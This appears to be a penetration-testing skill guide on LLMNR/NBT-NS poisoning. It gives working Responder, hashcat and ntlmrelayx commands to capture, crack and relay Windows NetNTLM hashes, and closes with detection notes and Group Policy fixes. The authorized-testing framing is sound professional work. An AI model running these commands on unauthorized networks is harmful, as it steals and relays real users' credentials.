---
name: llmnr-poisoning
description: Use when capturing authentication hashes on authorized Windows
  LAN segments. Covers how LLMNR and NBT-NS name resolution can be
  poisoned, running Responder to answer victim queries, capturing NetNTLMv1
  and NetNTLMv2 hashes, relaying safely within scope, cracking captured
  hashes with hashcat, and the Group Policy fixes that stop it. Use when
  the scope includes an internal Windows network and you need credential
  material or proof that name resolution poisoning works.
version: 1.0.0
domain: network
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [ad-enumeration, recon-active, password-attacks]
tools:
  - name: Responder
    version: 3.1.5
  - name: hashcat
    version: 6.2.6
  - name: nmap
    version: 7.98
---

When Windows cannot resolve a hostname through DNS, it falls back to
LLMNR (UDP 5355) and NBT-NS (UDP 137) broadcasts, asking the whole LAN
"who is this?" Responder answers "me," and the victim then tries to
authenticate to the attacker's fake service, handing over a NetNTLM
challenge-response hash. That hash cracks offline or relays to real
services. This skill covers authorized LLMNR/NBT-NS poisoning: running
Responder, capturing hashes, cracking them, and relaying only where the
scope explicitly allows it. Poisoning is active and visible, so it runs on
labs and explicitly scoped Windows segments only. All testing targets
systems you have written permission to test.

## Quick Workflow

1. Confirm the Windows segment is in the written scope and note the
   poisoning risks with the client.
2. Check that LLMNR/NBT-NS traffic exists on the wire before starting.
3. Configure Responder: disable unneeded servers, set the interface.
4. Run Responder and capture NetNTLMv2 hashes from victim broadcasts.
5. Crack captured hashes offline with hashcat and a good wordlist.
6. Relay only if the scope explicitly authorizes it, with tight targeting.
7. Stop Responder and verify the segment is quiet again.

## 1. Confirm the protocols are alive

Poisoning only works if victims actually broadcast. Listen first.

```bash
# Watch for LLMNR (UDP 5355) and NBT-NS (UDP 137) queries
sudo timeout 120 tshark -i eth0 -Y "udp.port==5355 or udp.port==137" \
  -T fields -e ip.src -e llmnr.qry.name -e nbns.name 2>/dev/null \
  | sort -u | head -30
```

Typical triggers: mistyped share paths (`\\fileservr\share`), dead
shortcuts, WPAD lookups, and applications resolving single label names.
If the wire is silent for several minutes, poisoning will catch nothing;
note the negative result and move on.

```bash
# nmap check for the related services on candidate victims
nmap -p 137,138,139,445 --open 192.168.1.0/24 -oG /tmp/smb-lan.gnmap
```

## 2. Configure Responder

Responder lives in its own directory; edit `Responder.conf` before the
first run on each engagement. The defaults are aggressive, so trim them to
the scope.

```bash
cd /opt/Responder 2>/dev/null || cd ~/Responder

# Recommended config for a standard hash capture run:
# [Responder Core] HTTP = On, SMB = On, LLMNR = On, NBT-NS = On,
#   DNS = Off (unless WPAD is in scope), FTP/LDAP/MSSQL = Off
grep -E "^(HTTP|SMB|LLMNR|NBT-NS|DNS|FTP|LDAP);? *=" Responder.conf | head -10
```

Turn off servers you do not need: each open listener is extra noise and
extra risk. Keep HTTP and SMB on for hash capture; leave DNS off unless
WPAD poisoning is explicitly in scope, because answering DNS affects the
whole segment.

```bash
# Bind to the test interface explicitly
sudo python3 Responder.py -I eth0 -w -r -d -F
# -w: start WPAD rogue server, -r: answer netbios wredir, -d: DHCP decode, -F: fingerprint
```

For a quiet hash-only run, drop the extras:

```bash
sudo python3 Responder.py -I eth0
```

## 3. Capture hashes

With Responder running, wait for victims to broadcast. Captures appear in
the terminal and land in the logs directory.

```bash
# Watch the Responder output for lines like:
# [SMBv2] NTLMv2-SSP Client   : 192.168.1.50
# [SMBv2] NTLMv2-SSP Username : CORP\jdoe
# [SMBv2] NTLMv2-SSP Hash     : jdoe::CORP:1122334455667788:...

# List captured hashes
ls -la logs/ | grep -i "smb.*ntlmv2"
cat logs/SMBv2-NTLMv2-SSP-192.168.1.50.txt 2>/dev/null | head -10
```

Each hash file holds `user::domain:server_challenge:nt_proof:rest`, which
is hashcat mode 5600 input. Do not rename the files; the names encode the
source.

To speed up capture in a lab (with permission), trigger a broadcast from
a lab victim yourself:

```bash
# On a LAB victim only: request a nonexistent share to force LLMNR/NBT-NS
# From cmd.exe on the victim: dir \\nonexistent123\share
```

Never trigger broadcasts on real user workstations without explicit
approval; waiting for natural traffic is the safe default.

## 4. Crack the hashes offline

Copy the hashes to your cracking box and run hashcat. NetNTLMv2 is mode
5600; NetNTLMv1 is mode 5500.

```bash
# Gather all captured v2 hashes into one file
cat logs/SMBv2-NTLMv2-SSP-*.txt > /tmp/ntlmv2.txt 2>/dev/null
wc -l /tmp/ntlmv2.txt

# Dictionary attack with rules
hashcat -m 5600 /tmp/ntlmv2.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Show cracked results
hashcat -m 5600 /tmp/ntlmv2.txt --show
```

```bash
# NetNTLMv1 (weaker, cracks faster): mode 5500
hashcat -m 5500 /tmp/ntlmv1.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --show
```

Build a target specific wordlist from the engagement (company name,
products, seasons, years) before burning GPU time on masks. One cracked
domain account often unlocks the whole next phase, so report cracked
credentials immediately through the agreed secure channel, not in chat
logs.

## 5. Relay (only when explicitly authorized)

Relaying forwards the victim's authentication to a real service (usually
SMB) instead of cracking it. It is powerful and easy to misuse: relaying
to the wrong host can lock accounts or change state. Scope it tightly.

```bash
# ntlmrelayx: relay to ONE explicit target, SMB only
sudo impacket-ntlmrelayx -t smb://192.168.1.20 -smb2support -i eth0

# With Responder, disable its SMB server so ntlmrelayx owns port 445
# In Responder.conf: SMB = Off, then run both tools together
```

Rules: one target host per run, no relaying to domain controllers unless
the scope names it, `--no-dump` unless credential dumping is authorized,
and stop the moment you have proof of access. A relayed session that only
runs `shares` and `whoami` style enumeration is enough for most reports.
See ad-enumeration for what to do with the access once proven.

Check SMB signing on the relay target first; signing defeats relay:

```bash
nmap -p 445 --script smb-security-mode 192.168.1.20 | grep -i signing
```

## 6. Stop cleanly

Responder poisons only while it runs; stopping it ends the attack. Still,
verify.

```bash
# Stop Responder with Ctrl-C, then confirm the wire is quiet
sudo timeout 60 tshark -i eth0 -Y "udp.port==5355 or udp.port==137" \
  2>/dev/null | wc -l
# Expect only natural background queries, none answered by your MAC

# Confirm no listener is left on 445/80
sudo ss -tlnp | grep -E ':445|:80' | grep -i respond || echo "clean"
```

## Edge cases

- No broadcasts arrive. The segment may have LLMNR disabled already, or
  victims are quiet; capture longer or test in a livelier window, then
  record the negative.
- Responder fails to bind port 445. Samba or another service holds it;
  stop the conflicting service or disable Responder's SMB server.
- Hashes crack to nothing. NetNTLMv2 with a strong password resists
  dictionaries; try the targeted wordlist once, then report the capture
  as proof of the poisoning vector itself.
- WPAD is in scope but nothing triggers. Modern browsers and OS versions
  changed WPAD behavior; verify with a lab victim before reporting it
  dead.
- The client runs a segmented network. Poisoning only affects your
  broadcast domain; each VLAN needs its own authorized run.
- Antivirus flags Responder. That is expected; run it from the attack
  platform, not from a client managed host, and warn the SOC contact so
  the alert is not treated as a real intrusion.

## Escalation

- Hash capture works but nothing cracks. Pivot to relaying against
  explicitly authorized targets with SMB signing disabled.
- Relay target has signing required. Note the control as effective and
  fall back to cracking or to other credential attacks (see
  password-attacks).
- LLMNR is disabled via GPO but NBT-NS is not. Poison NBT-NS only; many
  shops disable one and forget the other, so test both independently.
- Both are disabled. Verify with a packet capture, report the controls
  as effective, and close this attack path.

## Detection and defender view

Defenders see poisoning as LLMNR/NBT-NS responses from a host that is not
a server, spikes in UDP 5355/137 traffic, and Event ID 4624 logons on the
attacker's fake SMB service. EDR and NDR flag Responder's default
fingerprints (its HTTP server headers, its SMB dialect quirks). The
durable fixes, in order: disable LLMNR via Group Policy (Computer
Configuration, Administrative Templates, Network, DNS Client, Turn off
multicast name resolution), disable NetBIOS over TCP/IP via DHCP option
or adapter settings, require SMB signing everywhere, and monitor for
broadcast name resolution responses from unexpected hosts. These two GPO
changes kill the entire attack class at negligible cost.

## Key references

- MITRE ATT&CK T1557.001 (Adversary-in-the-Middle, LLMNR/NBT-NS
  Poisoning and SMB Relay).
- CWE-306 (Missing Authentication for Critical Function):
  unauthenticated name resolution.
- CWE-200 (Exposure of Sensitive Information): leaked challenge
  responses.
- Microsoft: "Turn off multicast name resolution" Group Policy
  documentation.
- Responder documentation: https://github.com/lgandx/Responder
- Impacket ntlmrelayx: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/
